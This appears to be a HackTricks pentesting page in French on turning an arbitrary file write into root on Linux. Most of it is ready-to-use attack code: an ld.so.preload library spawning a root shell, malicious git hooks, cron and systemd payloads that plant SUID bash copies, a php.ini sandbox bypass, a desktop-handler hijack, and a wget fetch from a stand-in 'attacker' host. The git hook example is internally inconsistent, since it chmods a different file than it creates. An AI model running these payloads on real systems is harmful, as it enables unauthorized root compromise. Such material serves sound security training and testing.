# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ce fichier se comporte comme la variable d'environnement **`LD_PRELOAD`** mais il fonctionne aussi dans les binaires **SUID**.\
Si vous pouvez le créer ou le modifier, vous pouvez simplement ajouter un **chemin vers une bibliothèque qui sera chargée** pour chaque binaire exécuté.

For example: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sont des **scripts** qui sont **exécutés** lors de divers **événements** dans un dépôt git, comme lorsqu'un commit est créé ou lors d'une merge... Donc, si un **script ou utilisateur privilégié** effectue ces actions fréquemment et qu'il est possible d'**écrire dans le dossier `.git`**, cela peut être utilisé pour **privesc**.

Par exemple, il est possible de **générer un script** dans un dépôt git dans **`.git/hooks`** afin qu'il soit toujours exécuté lorsqu'un nouveau commit est créé :
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & fichiers temporels

Si vous pouvez **écrire des fichiers liés à cron que root exécute**, vous pouvez généralement obtenir l'exécution de code la prochaine fois que le job s'exécute. Cibles intéressantes incluent :

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Le crontab de root dans `/var/spool/cron/` ou `/var/spool/cron/crontabs/`
- Les timers `systemd` et les services qu'ils déclenchent

Vérifications rapides :
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Voies d'abus typiques :

- **Ajouter une nouvelle root cron job** dans `/etc/crontab` ou un fichier dans `/etc/cron.d/`
- **Remplacer un script** déjà exécuté par `run-parts`
- **Mettre une backdoor dans une cible timer existante** en modifiant le script ou le binaire qu'elle lance

Exemple minimal de cron payload :
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Si vous ne pouvez écrire que dans un répertoire cron utilisé par `run-parts`, déposez-y un fichier exécutable à la place:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Remarques :

- `run-parts` ignore généralement les noms de fichiers contenant des points, donc privilégiez des noms comme `backup` au lieu de `backup.sh`.
- Certaines distributions utilisent `anacron` ou des timers `systemd` au lieu du cron classique, mais l'idée d'abus est la même : **modifier ce que root exécutera plus tard**.

### Fichiers Service & Socket

Si vous pouvez écrire des **`systemd` unit files** ou des fichiers référencés par ceux-ci, vous pourriez obtenir une exécution de code en tant que root en rechargant et redémarrant l'unité, ou en attendant que le chemin d'activation service/socket soit déclenché.

Cibles intéressantes :

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides dans `/etc/systemd/system/<unit>.d/*.conf`
- Scripts/binaires de service référencés par `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Chemins `EnvironmentFile=` inscriptibles chargés par un service exécuté en tant que root

Vérifications rapides :
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Chemins d'abus courants :

- **Overwrite `ExecStart=`** dans une unité de service appartenant à root que vous pouvez modifier
- **Add a drop-in override** avec un `ExecStart=` malveillant et effacer d'abord l'ancien
- **Backdoor the script/binary** déjà référencé par l'unité
- **Hijack a socket-activated service** en modifiant le fichier `.service` correspondant qui démarre lorsque la socket reçoit une connexion

Exemple d'override malveillant :
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Flux d'activation typique :
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Si vous ne pouvez pas redémarrer les services vous-même mais pouvez modifier une unité activée par socket, il peut suffire d'**attendre une connexion cliente** pour déclencher l'exécution du backdoored service en tant que root.

### Écraser un `php.ini` restrictif utilisé par un sandbox PHP privilégié

Certains daemons personnalisés valident du PHP fourni par l'utilisateur en exécutant `php` avec un **`php.ini` restrictif** (par exemple, `disable_functions=exec,system,...`). Si le code dans le sandbox dispose toujours de **any write primitive** (comme `file_put_contents`) et que vous pouvez atteindre le **chemin exact du `php.ini`** utilisé par le daemon, vous pouvez **écraser cette config** pour lever les restrictions, puis soumettre un second payload qui s'exécutera avec des privilèges élevés.

Déroulement typique:

1. Le premier payload écrase la configuration du sandbox.
2. Le second payload exécute du code maintenant que les fonctions dangereuses sont réactivées.

Exemple minimal (remplacez le chemin utilisé par le daemon) :
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Si le daemon s'exécute en tant que root (ou valide avec des chemins appartenant à root), la deuxième exécution aboutit à un contexte root. Il s'agit essentiellement de **privilege escalation via config overwrite** lorsque l'environnement sandboxé peut encore écrire des fichiers.

### binfmt_misc

Le fichier situé dans `/proc/sys/fs/binfmt_misc` indique quel binaire doit exécuter quel type de fichiers. TODO : vérifier les conditions nécessaires pour abuser de ceci afin d'exécuter un rev shell lorsqu'un type de fichier courant est ouvert.

### Remplacer les gestionnaires de schéma (comme http: ou https:)

Un attaquant ayant des permissions d'écriture sur les répertoires de configuration de la victime peut facilement remplacer ou créer des fichiers qui modifient le comportement du système, entraînant l'exécution de code non intentionnelle. En modifiant le fichier `$HOME/.config/mimeapps.list` pour pointer les gestionnaires d'URL HTTP et HTTPS vers un fichier malveillant (par ex., en mettant `x-scheme-handler/http=evil.desktop`), l'attaquant s'assure que **le clic sur n'importe quel lien http ou https déclenche le code spécifié dans ce fichier `evil.desktop`**. Par exemple, après avoir placé le code malveillant suivant dans `evil.desktop` dans `$HOME/.local/share/applications`, tout clic sur une URL externe exécute la commande embarquée :
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Pour plus d'informations, consultez [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) où il a été utilisé pour exploiter une vulnérabilité réelle.

### Root exécutant des scripts/binaires modifiables par l'utilisateur

Si un workflow privilégié exécute quelque chose comme `/bin/sh /home/username/.../script` (ou n'importe quel binaire situé dans un répertoire appartenant à un utilisateur non privilégié), vous pouvez le détourner :

- **Détecter l'exécution :** surveillez les processus avec [pspy](https://github.com/DominicBreuker/pspy) pour détecter root appelant des chemins contrôlés par l'utilisateur :
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirmer la possibilité d'écriture :** assurez-vous que le fichier cible et son répertoire appartiennent à votre utilisateur et soient écrivables.
- **Détourner la cible :** sauvegardez le binaire/script original et déposez une payload qui crée un SUID shell (ou toute autre action en root), puis restaurez les permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Déclenchez l'action privilégiée** (par ex., en appuyant sur un bouton UI qui lance le helper). Lorsque root réexécute le chemin détourné, récupérez le shell escaladé avec `./rootshell -p`.

## Références

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
